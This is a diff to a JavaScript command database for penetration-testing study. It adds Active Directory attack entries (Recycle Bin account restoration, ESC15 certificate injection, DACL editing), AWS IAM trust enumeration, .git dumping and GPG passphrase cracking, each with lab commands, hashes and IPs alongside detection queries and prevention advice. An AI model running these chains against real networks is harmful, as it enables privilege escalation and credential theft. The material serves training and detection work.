@@ -4458,6 +4458,216 @@ const COMMAND_DATA = {
       "explain": "A set of LDAP / AD-module filter queries that pinpoint attack targets without noisy full dumps. The lead example finds AS-REP roastable accounts:\n  Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}   accounts with pre-auth disabled\n  -Properties DoesNotRequirePreAuth   include that attribute in the output\nOther queries in the set cover Kerberoastable (servicePrincipalName=*), disabled accounts (userAccountControl bitwise), adminCount=1, Protected Users, and OU-scoped searches - each returns just the principals worth attacking."
     },
     {
+      "id": "ad-recycle-bin-restore",
+      "name": "AD Recycle Bin - Restore Deleted Objects",
+      "command": "Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties cn,objectSid,isDeleted,lastKnownParent",
+      "description": "When the AD Recycle Bin feature is enabled and you have sufficient privileges, you can enumerate and restore deleted AD objects (users, groups, computers). A deleted privileged account (like a cert_admin) can be restored to regain its original group memberships and permissions - an attacker who controls an account with Restore-ADObject rights can bring back a deleted admin.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Persistence",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "HTB TombWatcher engagement",
+      "tags": [
+        "recycle-bin",
+        "ad-persistence",
+        "restore-adobject",
+        "deleted-objects",
+        "privilege-escalation"
+      ],
+      "mitre": [
+        "T1098"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nAD Recycle Bin keeps deleted objects in a recoverable state (default 180 days).\nIf a privileged account was deleted (e.g. cert_admin), restoring it recovers\nthe account WITH its original SID, group memberships, and ACLs.\n\n=== ENUMERATE DELETED OBJECTS ===\n  Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties cn,objectSid,isDeleted\n\n=== FIND A SPECIFIC DELETED USER ===\n  Get-ADObject -Filter 'isDeleted -eq $true -and name -like \"cert_admin*\"' -IncludeDeletedObjects -Properties objectGUID,objectSid,lastKnownParent\n\n=== RESTORE THE OBJECT ===\n  Restore-ADObject -Identity '<objectGUID>'\n  # e.g. Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'\n\n=== RESET PASSWORD (account is restored but password is unknown) ===\n  Set-ADAccountPassword -Identity 'cert_admin' -Reset -NewPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)\n  # or from Linux:\n  bloodyAD --host <dc_ip> -d <domain> -u <user> -p <password> set password cert_admin 'NewPassword123'\n\n=== CHECK IF RECYCLE BIN IS ENABLED ===\n  Get-ADOptionalFeature 'Recycle Bin Feature' | Select EnabledScopes\n  # Empty EnabledScopes = NOT enabled\n\n=== NOTES ===\n- Multiple deleted objects with the same name get unique GUIDs - pick the right one\n- lastKnownParent shows the OU the object was in before deletion\n- Restored objects keep their original SID and group memberships",
+      "examples": [
+        {
+          "label": "List all deleted objects",
+          "command": "Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties cn,objectSid,isDeleted | Where-Object { $_.isDeleted -eq $true }"
+        },
+        {
+          "label": "Find specific deleted user by name",
+          "command": "Get-ADObject -Filter 'isDeleted -eq $true -and name -like \"cert_admin*\"' -IncludeDeletedObjects -Properties objectGUID,objectSid,lastKnownParent"
+        },
+        {
+          "label": "Restore a deleted object by GUID",
+          "command": "Restore-ADObject -Identity '938182c3-bf0b-410a-9aaa-45c8e1a02ebf'"
+        },
+        {
+          "label": "Reset the restored account's password",
+          "command": "Set-ADAccountPassword -Identity 'cert_admin' -Reset -NewPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)"
+        }
+      ],
+      "references": [
+        {
+          "title": "Microsoft - AD Recycle Bin",
+          "url": "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/introduction-to-active-directory-administrative-center-enhancements--level-100-#ad-recycle-bin"
+        },
+        {
+          "title": "HackTricks - AD Recycle Bin",
+          "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-impacket-dacledit",
+          "note": "After restoring the account, you may need dacledit to grant it enrollment rights on ADCS templates.",
+          "rel": "next"
+        },
+        {
+          "id": "ad-esc15-ekuwu",
+          "note": "A restored cert_admin can enroll in vulnerable certificate templates.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "AD Recycle Bin preserves deleted objects with all attributes for a tombstone lifetime (default 180 days). Any principal with the right to restore deleted objects can bring back privileged accounts, inheriting their original SID and group memberships.",
+        "prerequisites": "AD Recycle Bin must be enabled; the attacker needs delegated rights to Restore-ADObject (or Domain Admin).",
+        "impact": "Recovery of deleted privileged accounts with their original permissions, bypassing the deletion as a security control.",
+        "detection": "[MITRE T1098] Event 4662 with Restore access on isDeleted objects; Event 5136 for attribute changes on restored objects.",
+        "artifacts": "4662 restore events; newly active accounts that were previously in the Deleted Objects container.",
+        "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4662\n| where AccessMask=\"0x100\" AND ObjectType contains \"Deleted\"\n| table _time, SubjectUserName, ObjectName",
+        "elastic_kql": "event.code:\"4662\" AND winlog.event_data.ObjectType:*deleted*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4662\n| where ObjectType contains \"Deleted\" or ObjectName contains \"DEL:\"\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectName",
+        "sigma_rules": "win_security_ad_object_restored",
+        "prevention": "Restrict Restore-ADObject delegation; monitor for objects leaving the Deleted Objects container; alert on password resets immediately following object restoration.",
+        "sources": [
+          "HTB TombWatcher",
+          "https://attack.mitre.org/techniques/T1098/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "AD Recycle Bin object restoration",
+            "logic": "SecurityEvent\n| where EventID in (4662, 5136)\n| where ObjectName contains \"DEL:\" or ObjectName contains \"Deleted Objects\"\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectName, EventID\n| sort by TimeGenerated desc",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4662",
+              "5136"
+            ],
+            "attack": [
+              "T1098"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate disaster recovery restoring accidentally deleted accounts",
+            "tuning": "Alert specifically on restoration of accounts with adminCount=1 or membership in privileged groups"
+          }
+        ]
+      }
+    },
+    {
+      "id": "ad-esc15-ekuwu",
+      "name": "ADCS ESC15 / EKUwu (Application Policy Injection)",
+      "command": "certipy-esc15 req -ca <ca_name> -username <user> -hashes <nt_hash> -dc-ip <dc_ip> -template <template_name> --application-policies '1.3.6.1.4.1.311.20.2.1' -target-ip <dc_ip>",
+      "description": "ESC15 (EKUwu, CVE-2024-49019) abuses Schema Version 1 certificate templates where the enrollee supplies the subject. Version 1 templates ignore the template's EKU constraints if the request includes an Application Policies extension - you can inject Client Authentication (OID 1.3.6.1.5.5.7.3.2) or Certificate Request Agent (OID 1.3.6.1.4.1.311.20.2.1) into a Server Authentication-only template, turning it into a user-impersonation cert.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "ADCS Attacks",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "HTB TombWatcher engagement; CVE-2024-49019",
+      "tags": [
+        "adcs",
+        "esc15",
+        "ekuwu",
+        "certipy",
+        "certificate-abuse",
+        "cve-2024-49019",
+        "application-policies"
+      ],
+      "mitre": [
+        "T1649"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nSchema Version 1 templates process Application Policies from the CSR instead of\nenforcing the template's EKU. If the template has EnrolleeSuppliesSubject and you\ncan enroll, you inject a Client Authentication OID into a Server Auth template\nand get a cert that authenticates as any user.\n\n=== REQUIREMENTS ===\n- Template Schema Version = 1\n- EnrolleeSuppliesSubject = True\n- You have enrollment rights on the template\n- Environment NOT patched for CVE-2024-49019\n\n=== USING certipy-esc15 (separate tool/fork) ===\n  certipy-esc15 req \\\n    -ca <ca_name> \\\n    -username <user> \\\n    -hashes <nt_hash> \\\n    -dc-ip <dc_ip> \\\n    -template <template_name> \\\n    --application-policies '1.3.6.1.4.1.311.20.2.1' \\\n    -target-ip <dc_ip>\n\n=== USING certipy-ad v5+ (built-in) ===\n  certipy-ad req -u <user>@<domain> -hashes :<nt_hash> \\\n    -target <dc_ip> -ca <ca_name> -template <template_name> \\\n    -upn 'administrator@<domain>' \\\n    -sid '<admin_sid>' \\\n    -application-policies 'Client Authentication' \\\n    -out administrator\n\n=== THEN AUTHENTICATE ===\n  certipy-ad auth -pfx administrator.pfx -dc-ip <dc_ip>\n  # If auth fails (Server Auth only), pivot to PassTheCert instead\n\n=== ESC17 ===\nESC17 is related: EnrolleeSuppliesSubject + Server Authentication template.\nThe cert may work directly for auth if the CA processes it, or requires\nESC15 application-policy injection.",
+      "examples": [
+        {
+          "label": "certipy-esc15: inject enrollment agent OID",
+          "command": "certipy-esc15 req -ca tombwatcher-CA-1 -username cert_admin -hashes 0ef3298edfc59e0cd07c56d829eea9c6 -dc-ip 10.129.232.167 -template WebServer --application-policies '1.3.6.1.4.1.311.20.2.1' -target-ip 10.129.232.167"
+        },
+        {
+          "label": "certipy-ad v5: inject Client Auth with UPN+SID",
+          "command": "certipy-ad req -u cert_admin -hashes :0ef3298edfc59e0cd07c56d829eea9c6 -target 10.129.232.167 -ca tombwatcher-CA-1 -template WebServer -upn 'administrator@tombwatcher.htb' -sid 'S-1-5-21-1392491010-1358638721-2126982587-500' -application-policies 'Client Authentication' -out administrator"
+        },
+        {
+          "label": "Authenticate with the issued PFX",
+          "command": "certipy-ad auth -pfx administrator.pfx -dc-ip <dc_ip>"
+        }
+      ],
+      "references": [
+        {
+          "title": "CVE-2024-49019 (EKUwu)",
+          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019"
+        },
+        {
+          "title": "TrustedSec - EKUwu",
+          "url": "https://trustedsec.com/blog/ekuwu-not-just-an-exclamation-cve-2024-49019"
+        },
+        {
+          "title": "certipy-ad wiki",
+          "url": "https://github.com/ly4k/Certipy/wiki"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-passthecert",
+          "note": "If the cert has no Client Authentication EKU and certipy-ad auth fails, pivot to PassTheCert for LDAP shell access.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-recycle-bin-restore",
+          "note": "The enrollment account (e.g. cert_admin) may need to be restored from the Recycle Bin first.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Schema Version 1 certificate templates evaluate Application Policies from the CSR rather than enforcing the template's configured EKU, allowing an enrollee to override the intended certificate purpose.",
+        "prerequisites": "Enrollment rights on a Schema Version 1 template with EnrolleeSuppliesSubject; unpatched CA (pre-CVE-2024-49019 fix).",
+        "impact": "Domain Admin impersonation via certificate-based authentication.",
+        "detection": "[MITRE T1649] Event 4887 (certificate request) with Application Policies that differ from the template's EKU; Event 4886 (certificate issued) for templates not intended for client auth.",
+        "artifacts": "Certificate request with injected Application Policies; PFX file on attacker disk; 4768 PKINIT TGT request.",
+        "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4887\n| where CertificateTemplate=\"WebServer\" AND ApplicationPolicies!=\"1.3.6.1.5.5.7.3.1\"\n| table _time, Requester, CertificateTemplate, ApplicationPolicies",
+        "elastic_kql": "event.code:\"4887\" AND winlog.event_data.CertificateTemplate:\"WebServer\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4887\n| where CertificateTemplate has \"WebServer\"\n| project TimeGenerated, Requester, CertificateTemplate, SubjectName",
+        "sigma_rules": "win_security_certificate_request_esc15",
+        "prevention": "Patch CVE-2024-49019; upgrade Schema Version 1 templates to Version 2+; remove EnrolleeSuppliesSubject from templates that do not require it; restrict enrollment rights.",
+        "sources": [
+          "HTB TombWatcher",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "ESC15 - application policy injection in cert request",
+            "logic": "SecurityEvent\n| where EventID in (4886, 4887)\n| where CertificateTemplate has_any (\"WebServer\", \"DomainController\", \"IPSECIntermediateOnline\")\n| project TimeGenerated, Requester, CertificateTemplate, SubjectName\n| sort by TimeGenerated desc",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4886",
+              "4887"
+            ],
+            "attack": [
+              "T1649"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate certificate requests for Server Authentication templates",
+            "tuning": "Alert on requests from non-admin accounts to templates that normally only serve machines"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-adidnsdump",
       "name": "adidnsdump - Dump All AD DNS Records",
       "command": "adidnsdump -u <domain>\\<user> ldap://<dc_ip> -r",
@@ -10147,6 +10357,16 @@ const COMMAND_DATA = {
           "label": "List all managed policy versions",
           "command": "aws --profile <profile> iam list-policy-versions --policy-arn <policy_arn>",
           "description": "Executes an AWS CLI command for cloud infrastructure enumeration or exploitation."
+        },
+        {
+          "label": "Get role trust policy (AssumeRolePolicyDocument)",
+          "command": "aws --profile <profile> iam get-role --role-name <role_name>",
+          "description": "Inspects a role's trust policy to see who can assume it - other accounts, users, services (lambda, ec2). Key for identifying cross-account trust and lateral movement paths."
+        },
+        {
+          "label": "Find roles that trust a specific principal (jq filter)",
+          "command": "aws --profile <profile> iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument | tostring | contains(\"<role_or_principal>\")) | .RoleName'",
+          "description": "Searches all role trust policies for a specific principal name. Identifies which roles a compromised identity can assume - maps the lateral movement graph across roles and accounts."
         }
       ],
       "notes": "IAM permissions can come from: (1) inline user policy, (2) managed policy directly attached to user, (3) group membership -> group inline or managed policies, (4) resource-based policies on services (S3, Lambda, etc.), (5) permission boundaries. Permission boundaries RESTRICT the maximum effective permissions - a boundary that allows only S3 means even if a policy grants EC2 access, the user cannot use EC2. Explicit Deny always overrides Allow regardless of source. AWS-managed policies (arn:aws:iam::aws:policy/) can be read via get-policy-version even by the subject user - they are public. Customer-managed policies (arn:aws:iam::<account_id>:policy/) require iam:GetPolicyVersion which may not be granted. Workaround: use get-account-authorization-details (see aws-iam-full-dump) if broader read permissions exist.",
@@ -49492,6 +49712,107 @@ const COMMAND_DATA = {
       "explain": "Kerberoasts a trusted foreign forest using your local-forest credentials:\n  GetUserSPNs.py           request TGS tickets for SPN accounts\n  -request                 actually request the tickets (not just list)\n  -target-domain <foreign_domain>   the trusted domain whose service accounts you roast\n  <domain>/<user>:<password>   your local-forest credentials\nWith a bidirectional trust the foreign DC issues TGS tickets encrypted with the foreign account's key; crack them offline (hashcat -m 13100)."
     },
     {
+      "id": "git-dumper-exposed-git",
+      "name": "Git-Dumper - Dump Exposed .git Directories",
+      "command": "git-dumper http://<target>/.git /tmp/gitdump",
+      "description": "Extracts an exposed .git directory from a web server, reconstructing the full repository locally. Recovers source code, configuration files, and commit history - often revealing hardcoded credentials, API keys, internal URLs, and application logic. Common in dev/staging servers that deploy via git without proper .gitignore or web server rules to block .git access.",
+      "type": "command",
+      "platform": "linux",
+      "requires": [
+        "web-access"
+      ],
+      "tools": [
+        "git-dumper",
+        "git"
+      ],
+      "tags": [
+        "git",
+        "source-code",
+        "credentials",
+        "web",
+        "recon",
+        "cloud",
+        "ssrf"
+      ],
+      "category": "Reconnaissance",
+      "subcategory": "Web Applications",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "CWL MCRTA Lab - AWS Cloud Red Teaming",
+      "examples": [
+        {
+          "label": "Step 1 - Install git-dumper",
+          "command": "pip3 install git-dumper"
+        },
+        {
+          "label": "Step 2 - Dump exposed .git from target web server",
+          "command": "mkdir /tmp/gitdump\ngit-dumper http://<target>/.git /tmp/gitdump"
+        },
+        {
+          "label": "Step 3 - Review recovered source code",
+          "command": "cd /tmp/gitdump\nls -la\ngit log --oneline\ngit diff HEAD~1"
+        },
+        {
+          "label": "Step 4 - Search for secrets in commit history",
+          "command": "cd /tmp/gitdump\ngit log -p | grep -iE '(password|secret|key|token|api_key|aws_)'"
+        }
+      ],
+      "variations": [
+        {
+          "label": "Check if .git is exposed before dumping",
+          "command": "curl -s -o /dev/null -w '%{http_code}' http://<target>/.git/HEAD",
+          "description": "Returns 200 if .git/HEAD is accessible - confirms the .git directory is exposed before running a full dump."
+        },
+        {
+          "label": "Manual .git recovery without git-dumper",
+          "command": "wget --mirror -I .git http://<target>/.git/\ncd <target>\ngit checkout .",
+          "description": "Alternative manual approach using wget to mirror the .git directory and reconstruct the working tree."
+        }
+      ],
+      "notes": "After recovering source code, look for: (1) hardcoded credentials and API keys, (2) internal URLs and IP addresses, (3) SSRF/RCE vulnerabilities in the code logic, (4) database connection strings, (5) .env files or config files with secrets. Check all branches and the full commit history - secrets are often removed from HEAD but still visible in older commits.",
+      "references": [
+        {
+          "title": "git-dumper - GitHub",
+          "url": "https://github.com/arthaud/git-dumper"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ssrf-exploit",
+          "rel": "next",
+          "note": "Source code may reveal SSRF-vulnerable endpoints to exploit for cloud metadata theft."
+        },
+        {
+          "id": "aws-s3-git-secrets",
+          "rel": "next",
+          "note": "Recovered .git may contain AWS credentials or S3 bucket references."
+        }
+      ],
+      "opsec": "loud",
+      "mitre": [
+        "T1213",
+        "T1552.001"
+      ],
+      "exam": "exam-ok",
+      "defense": {
+        "why_it_works": "Web servers that deploy directly from git repositories often leave the .git directory accessible. The .git directory contains the full repository history including all commits, branches, and file contents - even files that were deleted or had secrets removed in later commits.",
+        "prerequisites": "Target web server with exposed .git directory. git-dumper or wget installed.",
+        "impact": "T1213 Data from Information Repositories + T1552.001 Unsecured Credentials: Credentials in Files. Full source code recovery enables further exploitation through discovered vulnerabilities and leaked credentials.",
+        "detection": "Web server access logs showing sequential requests to .git/ paths (objects, refs, HEAD, config). High volume of 200 responses to .git/* URIs from a single source IP.",
+        "artifacts": "Web server access logs: GET /.git/HEAD, GET /.git/objects/*, GET /.git/refs/* | IDS/WAF: pattern matching on .git path access",
+        "splunk_spl": "index=web sourcetype=\"access_combined\" uri_path=\"*/.git/*\" status=200\n| stats count dc(uri_path) as unique_paths by src_ip, host\n| where count > 20 AND unique_paths > 5",
+        "elastic_kql": "url.path:\"*/.git/*\" AND http.response.status_code:200",
+        "sentinel_kql": "W3CIISLog\n| where csUriStem contains \"/.git/\"\n| where scStatus == 200\n| summarize count(), dcount(csUriStem) by cIP, bin(TimeGenerated, 5m)\n| where count_ > 20",
+        "prevention": "Block access to .git directories in web server config (nginx: location ~ /\\.git { deny all; }). Use .gitignore properly. Deploy built artifacts instead of git repositories. Use WAF rules to block .git path access.",
+        "sources": [
+          "https://attack.mitre.org/techniques/T1213/",
+          "https://attack.mitre.org/techniques/T1552/001/"
+        ]
+      }
+    },
+    {
       "type": "payload",
       "platform": "linux",
       "requires": [
@@ -50310,6 +50631,75 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Forges a Golden Ticket - a TGT signed with the domain's krbtgt key - for persistent, arbitrary-user domain access:\n  golden                    forge a TGT offline\n  /rc4:<nt_hash>           the krbtgt NTLM hash (use /aes256 to be stealthier)\n  /domain:<domain> /sid:<domain_sid>   the domain and its SID\n  /user:Administrator      the identity to impersonate\n  /ptt                      inject the ticket into this session\nSince it is signed with krbtgt, the KDC honors it for any service; access the DC (dir \\\\<dc>\\C$). /ldap /printcmd auto-fills real PAC values for opsec."
+    },
+    {
+      "id": "gpg2john-pgp-crack",
+      "name": "gpg2john - Crack PGP/GPG Private Key Passphrase",
+      "command": "gpg2john <private_key_file> > gpg.hash && john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash --format=gpg",
+      "description": "Extract the passphrase hash from a PGP/GPG private key file and crack it offline with john. Useful when you find .keys, .gpg, or .asc private key files on a target - the passphrase protects the private key, and cracking it gives you the ability to decrypt PGP-encrypted data (emails, password stores like passpie, encrypted files).",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Credential Cracking",
+      "subcategory": "PGP Keys",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "HTB MetaTwo engagement",
+      "tags": [
+        "gpg2john",
+        "pgp",
+        "gpg",
+        "cracking",
+        "private-key",
+        "passphrase",
+        "john"
+      ],
+      "mitre": [
+        "T1552.004"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nPGP/GPG private keys are encrypted with a passphrase. gpg2john extracts\nthe passphrase-derived hash so it can be cracked offline with john.\n\n=== EXTRACT HASH ===\n  gpg2john <private_key_file> > gpg.hash\n  # The key file can be .keys, .gpg, .asc, or raw PGP private key block\n  # If the file has BOTH public and private keys, gpg2john handles it\n\n=== CRACK WITH JOHN ===\n  john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash --format=gpg\n\n=== CRACK WITH HASHCAT ===\n  # Not directly supported - use john for GPG hashes\n\n=== THEN USE THE KEY ===\n  # Import the key into your GPG keyring\n  gpg --import <private_key_file>\n  # Decrypt a file/message\n  gpg --decrypt <encrypted_file>\n  # For passpie: export the password store\n  passpie export ~/passwords.db  # enter the cracked passphrase\n\n=== WHERE TO FIND PGP KEYS ===\n  ~/.gnupg/\n  ~/.passpie/.keys\n  /home/*/.gpg\n  /opt/*/keys/\n  Application config directories",
+      "examples": [
+        {
+          "label": "Extract hash and crack GPG passphrase",
+          "command": "gpg2john keys > gpg.hash && john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash --format=gpg"
+        },
+        {
+          "label": "Just extract the hash for review",
+          "command": "gpg2john ~/.passpie/.keys > keys.hash && cat keys.hash"
+        }
+      ],
+      "references": [
+        {
+          "title": "john the ripper - gpg2john",
+          "url": "https://github.com/openwall/john"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "passpie-credential-theft",
+          "note": "Cracked GPG passphrase unlocks passpie password stores.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "PGP private keys are symmetrically encrypted with a passphrase-derived key. gpg2john extracts the encrypted key material into a format john can brute-force. Weak passphrases crack quickly.",
+        "prerequisites": "Access to a PGP/GPG private key file on the target system.",
+        "impact": "Decryption of all data encrypted to that PGP key - emails, password stores, encrypted files.",
+        "detection": "[MITRE T1552.004] File access to .gnupg directories or .keys files (auditd rules); no network indicator since cracking is offline.",
+        "artifacts": "Access to .gnupg/ or .keys files in filesystem audit logs; cracked passphrase used to decrypt data.",
+        "splunk_spl": "index=linux sourcetype=linux:audit key=\"access\" name=\"*.keys\" OR name=\"*.gpg\" OR name=\"secring*\"\n| table _time, user, name, success",
+        "elastic_kql": "file.path:(*\\.gnupg* OR *\\.keys OR *secring*) AND event.action:\"opened-for-read\"",
+        "sentinel_kql": "Syslog\n| where SyslogMessage contains \".gnupg\" or SyslogMessage contains \".keys\" or SyslogMessage contains \"secring\"\n| project TimeGenerated, Computer, SyslogMessage",
+        "prevention": "Use strong passphrases on PGP keys; restrict file permissions on private keys (600); use hardware tokens (YubiKey) for PGP keys; monitor access to .gnupg directories.",
+        "sources": [
+          "HTB MetaTwo",
+          "https://attack.mitre.org/techniques/T1552/004/"
+        ]
+      }
     },
     {
       "id": "crtp-gpo-abuse",
@@ -61011,6 +61401,206 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Requests TGS-REP tickets for SPN accounts and saves hashcat-ready hashes:\n  GetUserSPNs.py           impacket Kerberoaster\n  -dc-ip <dc_ip>           the Domain Controller\n  <domain>/<user>          authenticating credentials (add :<password>)\n  -request                 actually pull the TGS tickets (the encrypted ticket is the crackable material)\n  -outputfile <outfile>    write the hashes to file\nCrack offline with hashcat -m 13100; use -request-user <name> to target a single high-value account."
+    },
+    {
+      "id": "ad-impacket-dacledit",
+      "name": "impacket-dacledit (DACL Editing)",
+      "command": "impacket-dacledit -action write -rights FullControl -principal '<user>' -target-dn '<target_dn>' -dc-ip <dc_ip> '<domain>/<user>' -hashes ':<nt_hash>'",
+      "description": "Modify the Discretionary Access Control List (DACL) on an AD object (user, group, OU, or container) to grant arbitrary permissions. With WriteDACL over a target, you can grant yourself FullControl, GenericAll, or specific rights like WriteProperty. Commonly used in ACL abuse chains to escalate from WriteDACL to full object control.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ACL Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "HTB TombWatcher engagement",
+      "tags": [
+        "writedacl",
+        "dacl",
+        "acl-abuse",
+        "impacket",
+        "ad-permissions",
+        "fullcontrol"
+      ],
+      "mitre": [
+        "T1222.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nWriteDACL lets you add new ACEs to an object's DACL. impacket-dacledit\nwrites FullControl (or specific rights) for your principal on the target\nobject. This is the bridge between WriteDACL and full control.\n\n=== GRANT FULLCONTROL ON AN OU ===\n  impacket-dacledit -action write -rights FullControl -inheritance \\\n    -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' \\\n    -dc-ip <dc_ip> '<domain>/john' -hashes ':<nt_hash>'\n  # -inheritance means child objects inherit the ACE\n\n=== GRANT GENERICALL ON A USER ===\n  impacket-dacledit -action write -rights GenericAll \\\n    -principal 'attacker' -target 'victim' \\\n    -dc-ip <dc_ip> '<domain>/attacker:<password>'\n\n=== RESTORE (cleanup) ===\n  impacket-dacledit -action restore -file dacledit-YYYYMMDD-HHMMSS.bak \\\n    -dc-ip <dc_ip> '<domain>/attacker:<password>'\n  # The backup file is created automatically on each write\n\n=== NOTES ===\n- Objects with adminCount=1 do NOT inherit ACEs from parent OUs (AdminSDHolder protection)\n- The tool creates a .bak file on each write for restoration\n- Use -inheritance flag when you need the ACE to propagate to child objects",
+      "examples": [
+        {
+          "label": "Grant FullControl on an OU with inheritance",
+          "command": "impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' -dc-ip 10.129.232.167 'TOMBWATCHER.HTB/john' -hashes ':ad9324754583e3e42b55aad4d3b8d2bf'"
+        },
+        {
+          "label": "Grant GenericAll on a user with password auth",
+          "command": "impacket-dacledit -action write -rights GenericAll -principal '<user>' -target '<target_account>' -dc-ip <dc_ip> '<domain>/<user>:<password>'"
+        },
+        {
+          "label": "Restore original DACL from backup",
+          "command": "impacket-dacledit -action restore -file dacledit-20261102-192707.bak -dc-ip <dc_ip> '<domain>/<user>:<password>'"
+        }
+      ],
+      "references": [
+        {
+          "title": "impacket dacledit.py",
+          "url": "https://github.com/fortra/impacket"
+        },
+        {
+          "title": "The Hacker Recipes - WriteDACL",
+          "url": "https://www.thehacker.recipes/ad/movement/dacl/write-dacl"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-impacket-owneredit",
+          "note": "If you have WriteOwner instead of WriteDACL, take ownership first, then you get implicit WriteDACL.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-shadow-credentials",
+          "note": "Once you have FullControl, Shadow Credentials takes the account.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "WriteDACL permission allows adding new ACEs to the object's security descriptor. The attacker grants themselves FullControl, then pivots through password reset, Shadow Credentials, or other write-based attacks.",
+        "prerequisites": "WriteDACL over the target object (user, group, OU, or container).",
+        "impact": "Arbitrary permission grant on the target - effectively full control of any objects under the modified DACL.",
+        "detection": "[MITRE T1222.001] Event 5136 modifying nTSecurityDescriptor; Event 4662 with WriteProperty on the DACL.",
+        "artifacts": "5136 DACL modification events; dacledit .bak backup file on attacker disk.",
+        "splunk_spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=5136 AttributeLDAPDisplayName=\"nTSecurityDescriptor\"\n| table _time, SubjectUserName, ObjectDN, OperationType",
+        "elastic_kql": "event.code:\"5136\" AND winlog.event_data.AttributeLDAPDisplayName:\"nTSecurityDescriptor\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 5136 and AttributeLDAPDisplayName == \"nTSecurityDescriptor\"\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectDN, Op=OperationType",
+        "sigma_rules": "win_security_dacl_modified_on_ad_object",
+        "prevention": "Monitor nTSecurityDescriptor changes (5136) on sensitive OUs and objects; use AdminSDHolder; restrict WriteDACL delegation.",
+        "sources": [
+          "HTB TombWatcher",
+          "https://attack.mitre.org/techniques/T1222/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "DACL modification on AD object",
+            "logic": "SecurityEvent\n| where EventID == 5136 and AttributeLDAPDisplayName == \"nTSecurityDescriptor\"\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectDN, Op=OperationType\n| where Target contains \"OU=\" or Target contains \"CN=Domain Admins\"",
+            "data_source": "windows-security",
+            "log_ids": [
+              "5136"
+            ],
+            "attack": [
+              "T1222.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate delegation changes by AD administrators",
+            "tuning": "Filter to sensitive OUs and high-value targets; baseline normal DACL changes"
+          }
+        ]
+      }
+    },
+    {
+      "id": "ad-impacket-owneredit",
+      "name": "impacket-owneredit (WriteOwner Abuse)",
+      "command": "impacket-owneredit -action write -new-owner '<user>' -target '<target_account>' -dc-ip <dc_ip> '<domain>/<user>:<password>'",
